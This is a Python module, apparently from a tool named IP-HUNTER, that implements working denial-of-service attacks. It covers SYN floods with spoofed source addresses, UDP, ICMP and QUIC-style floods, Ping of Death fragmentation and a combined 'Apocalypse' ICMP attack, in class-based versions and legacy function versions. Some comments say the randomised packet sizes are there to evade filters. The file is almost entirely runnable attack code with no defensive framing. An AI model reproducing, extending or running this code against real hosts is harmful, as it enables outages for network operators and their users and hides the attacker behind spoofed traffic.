"""
Layer 4 Attack Classes for IP-HUNTER v2.2.0
Class-based implementation extending AttackBase for unified lifecycle management
"""

import time
import socket
import random
from typing import Callable
from scapy.all import IP, TCP, UDP, ICMP, RandIP, RandShort, Raw, send, fragment
from src.utils.logging import add_system_log
from src.security import stop_event
from src.attacks.base import AttackBase


class SynFloodAttack(AttackBase):
    """TCP SYN Flood Attack with IP spoofing - Class-based implementation"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 10, 
                 duration: int = 60, max_requests: int = 0):
        super().__init__(target, port, threads, duration)
        self.max_requests = max_requests
        self.attack_name = "Layer 4 SYN Flood"
        self.category = "Layer 4"
    
    def _setup_attack(self) -> bool:
        """Setup SYN flood parameters"""
        try:
            # Validate target IP
            socket.inet_aton(self.target)
            return True
        except socket.error:
            # Try to resolve hostname
            try:
                self.target = socket.gethostbyname(self.target)
                return True
            except socket.gaierror:
                add_system_log(f"[red]SYN Flood: Invalid target IP/hostname[/red]")
                return False
    
    def _create_worker(self) -> Callable:
        """Create worker function for SYN flood"""
        def worker():
            while not self.should_stop:
                if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
                    break
                try:
                    ip = IP(src=RandIP(), dst=self.target)
                    tcp = TCP(sport=RandShort(), dport=self.port, flags="S")
                    raw = Raw(b"X" * 1024)
                    send(ip / tcp / raw, loop=0, verbose=0)
                    self.metrics.update(packets=1, bytes_sent=1024)
                except Exception:
                    self.metrics.update(failed=1)
                    time.sleep(0.01)
        return worker


class UdpFloodAttack(AttackBase):
    """UDP Flood Attack with randomized payloads - Class-based implementation"""
    
    def __init__(self, target: str, port: int = 80, threads: int = 10,
                 duration: int = 60, max_requests: int = 0):
        super().__init__(target, port, threads, duration)
        self.max_requests = max_requests
        self.attack_name = "Layer 4 UDP Flood"
        self.category = "Layer 4"
        self._sockets = []
    
    def _setup_attack(self) -> bool:
        """Setup UDP flood parameters"""
        try:
            socket.inet_aton(self.target)
            return True
        except socket.error:
            try:
                self.target = socket.gethostbyname(self.target)
                return True
            except socket.gaierror:
                add_system_log(f"[red]UDP Flood: Invalid target IP/hostname[/red]")
                return False
    
    def _create_worker(self) -> Callable:
        """Create worker function for UDP flood"""
        def worker():
            from src.security import increment_socket_counter, decrement_socket_counter
            sock = None
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                increment_socket_counter()
                self._sockets.append(sock)
                
                while not self.should_stop:
                    if self.max_requests > 0 and self.metrics.packets_sent >= self.max_requests:
                        break
                    try:
                        # Randomize payload size to evade packet-length filters
                        size = random.randint(512, 1490)
                        payload = random._urandom(size)
                        sock.sendto(payload, (self.target, self.port))
                        self.metrics.update(packets=1, bytes_sent=size)
                    except Exception:
                        self.metrics.update(failed=1)
            finally:
                if sock:
                    try:
                        sock.close()
                        self._sockets.remove(sock)
                    except:
                        pass
                    decrement_socket_counter()
        return worker
    
    def _cleanup(self):
        """Close all UDP sockets"""
        for sock in self._sockets:
            try:
                sock.close()
            except:
                pass
        self._sockets.clear()


class IcmpFloodAttack(AttackBase):
    """ICMP (Ping) Flood Attack - Class-based implementation"""
    
    def __init__(self, target: str, port: int = 0, threads: int = 10,
                 duration: int = 60):
        super().__init__(target, port, threads, duration)
        self.attack_name = "Layer 4 ICMP Flood"
        self.category = "Layer 4"
    
    def _setup_attack(self) -> bool:
        """Setup ICMP flood parameters"""
        try:
            socket.inet_aton(self.target)
            return True
        except socket.error:
            try:
                self.target = socket.gethostbyname(self.target)
                return True
            except socket.gaierror:
                add_system_log(f"[red]ICMP Flood: Invalid target IP/hostname[/red]")
                return False
    
    def _create_worker(self) -> Callable:
        """Create worker function for ICMP flood"""
        def worker():
            while not self.should_stop:
                try:
                    size = random.randint(32, 1024)
                    packet = IP(dst=self.target)/ICMP()/Raw(load=random._urandom(size))
                    send(packet, verbose=0)
                    self.metrics.update(packets=1, bytes_sent=size)
                except Exception:
                    self.metrics.update(failed=1)
        return worker


class PingOfDeathAttack(AttackBase):
    """Ping of Death Attack - oversized fragmented ICMP packets"""
    
    def __init__(self, target: str, port: int = 0, threads: int = 5,
                 duration: int = 60):
        super().__init__(target, port, threads, duration)
        self.attack_name = "Ping of Death"
        self.category = "Layer 4"
    
    def _setup_attack(self) -> bool:
        """Setup Ping of Death parameters"""
        try:
            socket.inet_aton(self.target)
            return True
        except socket.error:
            try:
                self.target = socket.gethostbyname(self.target)
                return True
            except socket.gaierror:
                add_system_log(f"[red]Ping of Death: Invalid target IP/hostname[/red]")
                return False
    
    def _create_worker(self) -> Callable:
        """Create worker function for Ping of Death"""
        def worker():
            while not self.should_stop:
                try:
                    # Vary the size to look less uniform
                    size = random.randint(60000, 65500)
                    packet = IP(dst=self.target)/ICMP()/Raw(load="X"*size)
                    frags = fragment(packet)
                    for f in frags:
                        send(f, verbose=0)
                    self.metrics.update(packets=len(frags), bytes_sent=size)
                except Exception:
                    self.metrics.update(failed=1)
        return worker


class IcmpHybridAttack(AttackBase):
    """Hybrid ICMP Attack - Combines Flood and Ping of Death"""
    
    def __init__(self, target: str, port: int = 0, threads: int = 10,
                 duration: int = 60):
        super().__init__(target, port, threads, duration)
        self.attack_name = "Layer 4 ICMP Hybrid (Apocalypse)"
        self.category = "Layer 4"
        self._flood = IcmpFloodAttack(target, port, threads, duration)
        self._pod = PingOfDeathAttack(target, port, threads // 2 or 1, duration)

    def _setup_attack(self) -> bool:
        return self._flood._setup_attack() and self._pod._setup_attack()

    def _create_worker(self) -> Callable:
        # Alternates between flood and PoD
        def worker():
            f_worker = self._flood._create_worker()
            p_worker = self._pod._create_worker()
            
            # Link metrics so they report to the main hybrid class
            self._flood.metrics = self.metrics
            self._pod.metrics = self.metrics
            
            # We run sub-workers in this thread or just use one
            if random.random() > 0.5:
                f_worker()
            else:
                p_worker()
        return worker

    def start(self) -> bool:
        # Override start to ensure should_stop is synced
        res = super().start()
        self._flood.should_stop = self.should_stop
        self._pod.should_stop = self.should_stop
        return res

    def stop(self):
        super().stop()
        self._flood.stop()
        self._pod.stop()


class QuicFloodAttack(AttackBase):
    """QUIC-like UDP Flood Attack with dynamic payloads"""
    
    def __init__(self, target: str, port: int = 443, threads: int = 10,
                 duration: int = 60):
        super().__init__(target, port, threads, duration)
        self.attack_name = "QUIC Flood (HTTP/3)"
        self.category = "Layer 4"
        self._sockets = []
    
    def _setup_attack(self) -> bool:
        """Setup QUIC flood parameters"""
        try:
            socket.inet_aton(self.target)
            return True
        except socket.error:
            try:
                self.target = socket.gethostbyname(self.target)
                return True
            except socket.gaierror:
                add_system_log(f"[red]QUIC Flood: Invalid target IP/hostname[/red]")
                return False
    
    def _create_worker(self) -> Callable:
        """Create worker function for QUIC flood"""
        def worker():
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            self._sockets.append(sock)
            try:
                while not self.should_stop:
                    try:
                        size = random.randint(1000, 1300)
                        payload = random._urandom(size)
                        sock.sendto(payload, (self.target, self.port))
                        self.metrics.update(packets=1, bytes_sent=size)
                    except Exception:
                        self.metrics.update(failed=1)
            finally:
                try:
                    sock.close()
                    self._sockets.remove(sock)
                except:
                    pass
        return worker
    
    def _cleanup(self):
        """Close all sockets"""
        for sock in self._sockets:
            try:
                sock.close()
            except:
                pass
        self._sockets.clear()


# =============================================================================
# Legacy functions for backward compatibility
# =============================================================================

def syn_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
    """TCP SYN flood with IP spoofing (legacy function)"""
    end_time = time.time() + duration
    while time.time() < end_time:
        if stop_event.is_set(): break
        if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
            break
        try:
            ip = IP(src=RandIP(), dst=target_ip)
            tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
            raw = Raw(b"X" * 1024)
            send(ip / tcp / raw, loop=0, verbose=0)
            if monitor:
                monitor.update_stats(packets=1, bytes_sent=1024)
        except:
            if monitor:
                monitor.update_stats(failed=1)
            continue

def udp_flood(target_ip, target_port, duration, monitor=None, max_requests=0):
    """UDP flood with randomized payloads (legacy function)"""
    from src.security import increment_socket_counter, decrement_socket_counter
    end_time = time.time() + duration
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        increment_socket_counter()
        while time.time() < end_time:
            if max_requests > 0 and monitor and monitor.packets_sent >= max_requests:
                break
            # Randomize payload size to evade packet-length filters
            size = random.randint(512, 1490)
            payload = random._urandom(size)
            sock.sendto(payload, (target_ip, target_port))
            if monitor:
                monitor.update_stats(packets=1, bytes_sent=size)
    except:
        if monitor:
            monitor.update_stats(failed=1)
    finally:
        decrement_socket_counter()
        if sock:
            try: sock.close()
            except: pass

def icmp_flood(target_ip, duration, monitor=None):
    """ICMP (Ping) Flood - Randomized payload size (legacy function)"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            size = random.randint(32, 1024)
            packet = IP(dst=target_ip)/ICMP()/Raw(load=random._urandom(size))
            send(packet, verbose=0)
            if monitor: monitor.update_stats(packets=1, bytes_sent=size)
        except:
            if monitor: monitor.update_stats(failed=1)

def ping_of_death(target_ip, duration, monitor=None):
    """Ping of Death - oversized fragmented ICMP packets (legacy function)"""
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            # Vary the size to look less uniform
            size = random.randint(60000, 65500)
            packet = IP(dst=target_ip)/ICMP()/Raw(load="X"*size)
            frags = fragment(packet)
            for f in frags:
                send(f, verbose=0)
            if monitor: monitor.update_stats(packets=len(frags), bytes_sent=size)
        except:
            if monitor: monitor.update_stats(failed=1)

def quic_flood(target_ip, target_port, duration, monitor=None):
    """QUIC-like UDP Flood with dynamic payloads (legacy function)"""
    end_time = time.time() + duration
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        while time.time() < end_time:
            try:
                size = random.randint(1000, 1300)
                payload = random._urandom(size)
                sock.sendto(payload, (target_ip, target_port))
                if monitor: monitor.update_stats(packets=1, bytes_sent=size)
            except:
                if monitor: monitor.update_stats(failed=1)
    finally:
        try: sock.close()
        except: pass

